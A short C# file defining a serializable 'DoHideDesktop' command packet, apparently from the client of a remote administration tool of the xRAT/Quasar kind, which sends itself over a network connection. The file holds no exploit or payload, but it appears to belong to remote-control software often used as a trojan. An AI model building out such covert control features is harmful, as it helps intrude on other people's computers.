using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoHideDesktop : IPacket
{
	public string Text { get; set; }

	public DoHideDesktop()
	{
	}

	public DoHideDesktop(string text)
	{
		Text = text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
